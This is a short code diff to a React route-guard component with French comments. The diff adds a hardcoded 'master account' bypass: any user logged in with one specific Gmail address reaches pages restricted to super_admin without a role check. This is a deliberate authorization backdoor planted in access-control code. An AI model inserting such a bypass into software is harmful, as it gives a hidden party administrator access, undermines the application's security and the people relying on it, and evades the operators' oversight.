@@ -24,7 +24,13 @@ const RoleGuard = ({ children, allowedRoles }: RoleGuardProps) => {
     return <Navigate to="/connexion" replace />;
   }
 
-  // Vérifier le rôle
+  // Vérifier le rôle (avec Bypass spécial pour le compte maître)
+  const estCompteMaitre = utilisateur?.email?.toLowerCase() === 'securitstech@gmail.com';
+
+  if (estCompteMaitre && allowedRoles.includes('super_admin')) {
+    return <>{children}</>;
+  }
+
   if (!profil || !allowedRoles.includes(profil.role)) {
     return <Navigate to="/" replace />;
   }
